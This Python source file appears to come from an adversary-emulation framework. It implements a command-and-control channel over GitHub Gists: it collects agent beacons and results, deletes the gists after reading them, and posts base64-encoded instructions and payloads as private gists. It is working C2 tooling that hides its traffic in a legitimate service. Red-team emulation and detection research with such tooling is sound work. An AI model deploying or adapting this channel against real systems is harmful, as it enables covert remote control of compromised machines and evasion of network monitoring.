import aiohttp
import asyncio
import json
import re
import uuid

from base64 import b64encode

from app.utility.base_world import BaseWorld


def api_access(func):
    async def process(*args, **kwargs):
        async with aiohttp.ClientSession(headers=dict(Authorization='token {}'.format(args[0].key)),
                                         connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
            kwargs['session'] = session
            return await func(*args, **kwargs)
    return process


class Contact(BaseWorld):

    def __init__(self, services):
        self.name = 'gist'
        self.description = 'Use gist for C2'
        self.file_svc = services.get('file_svc')
        self.contact_svc = services.get('contact_svc')
        self.log = self.create_logger('contact_gist')
        self.key = ''

    def retrieve_config(self):
        return self.key

    async def start(self):
        if await self.valid_config():
            self.key = self.get_config('app.contact.gist')
            loop = asyncio.get_event_loop()
            loop.create_task(self.gist_operation_loop())

    async def gist_operation_loop(self):
        while True:
            await self.handle_beacons(await self.get_results())
            await self.handle_beacons(await self.get_beacons())
            await asyncio.sleep(15)

    async def valid_config(self):
        return re.compile(pattern='[a-zA-Z0-9]{40,40}').match(self.get_config('app.contact.gist'))

    async def handle_beacons(self, beacons):
        """
        Handles various beacons types (beacon and results)
        """
        for beacon in beacons:
            if 'contact' not in beacon:
                beacon['contact'] = self.name
            agent, instructions = await self.contact_svc.handle_heartbeat(**beacon)
            await self._send_payloads(agent, instructions)
            await self._send_instructions(agent, instructions)

    async def get_results(self):
        """
        Retrieve all GIST posted results for a this C2's api key
        :return:
        """
        try:
            return await self._get_gist_data(comm_type='results')
        except Exception:
            self.log.debug('Retrieving results over c2 (%s) failed!' % self.__class__.__name__)
            return []

    async def get_beacons(self):
        """
        Retrieve all GIST beacons for a particular api key
        :return: the beacons
        """
        try:
            return await self._get_gist_data(comm_type='beacon')
        except Exception:
            self.log.debug('Receiving beacons over c2 (%s) failed!' % self.__class__.__name__)
            return []

    """ PRIVATE """

    async def _send_instructions(self, agent, instructions):
        response = dict(paw=agent.paw,
                        sleep=await agent.calculate_sleep(),
                        watchdog=agent.watchdog,
                        instructions=json.dumps([json.dumps(i.display) for i in instructions]))
        if agent.gui_selected_contact != agent.contact:
            response['new_contact'] = agent.gui_selected_contact
        await self._post_instructions(self._encode_string(json.dumps(response).encode('utf-8')), agent.paw)

    async def _post_instructions(self, text, paw):
        try:
            if await self._wait_for_paw(paw, comm_type='instructions'):
                return
            return await self._post_gist(self._build_gist_content(comm_type='instructions', paw=paw,
                                                                  files={str(uuid.uuid4()): dict(content=text)}))
        except Exception:
            self.log.warning('Posting instructions over c2 (%s) failed!' % self.__class__.__name__)

    async def _send_payloads(self, agent, instructions):
        for i in instructions:
            for p in i.payloads:
                filename, payload_contents = await self._get_payload_content(p, agent)
                await self._post_payloads(filename, payload_contents, '%s-%s' % (agent.paw, filename))

    async def _post_payloads(self, filename, payload_contents, paw):
        try:
            files = {filename: dict(content=self._encode_string(payload_contents))}
            if len(files) < 1 or await self._wait_for_paw(paw, comm_type='payloads'):
                return
            return await self._post_gist(self._build_gist_content(comm_type='payloads', paw=paw, files=files))
        except Exception as e:
            self.log.warning('Posting payload over c2 (%s) failed! %s' % (self.__class__.__name__, e))

    async def _get_raw_gist_urls(self, comm_type):
        return [(g['files'][file]['raw_url'], g['id']) for g in await self._get_gists() for file in g.get('files')
                if comm_type in g['description']]

    async def _get_gist_content(self, urls):
        return [await self._fetch_content(url) for url in urls]

    async def _wait_for_paw(self, paw, comm_type):
        for gist_content in await self._get_gists():
            if '{}-{}'.format(comm_type, paw) == gist_content['description']:
                return True
        return False

    async def _get_gist_data(self, comm_type):
        data = await self._get_raw_gist_urls(comm_type=comm_type)
        content = await self._get_gist_content([d[0] for d in data])
        await self._delete_gists(gist_ids=[d[1] for d in data])
        return content

    async def _get_payload_content(self, payload, beacon):
        if payload in self.file_svc.special_payloads:
            f = await self.file_svc.special_payloads[payload](dict(file=payload, platform=beacon['platform']))
            return await self.file_svc.read_file(f)
        return await self.file_svc.read_file(payload)

    @staticmethod
    def _build_gist_content(comm_type, paw, files):
        return dict(description='{}-{}'.format(comm_type, paw), public=False, files=files)

    @api_access
    async def _post_gist(self, gist_content, session):
        return await self._post(session, 'https://api.github.com/gists', body=gist_content)

    @api_access
    async def _fetch_content(self, url, session):
        return json.loads(self.file_svc.decode_bytes(await self._fetch(session, url)))

    @api_access
    async def _get_gists(self, session):
        return json.loads(await self._fetch(session, 'https://api.github.com/gists'))

    @api_access
    async def _delete_gists(self, gist_ids, session):
        for _id in gist_ids:
            await self._delete(session, 'https://api.github.com/gists/{}'.format(_id))

    @staticmethod
    async def _delete(session, url):
        async with session.delete(url) as response:
            return await response.text('ISO-8859-1')

    @staticmethod
    async def _fetch(session, url):
        async with session.get(url) as response:
            return await response.text()

    @staticmethod
    async def _post(session, url, body):
        async with session.post(url, json=body) as response:
            return await response.text()

    @staticmethod
    def _encode_string(s):
        return str(b64encode(s), 'utf-8')
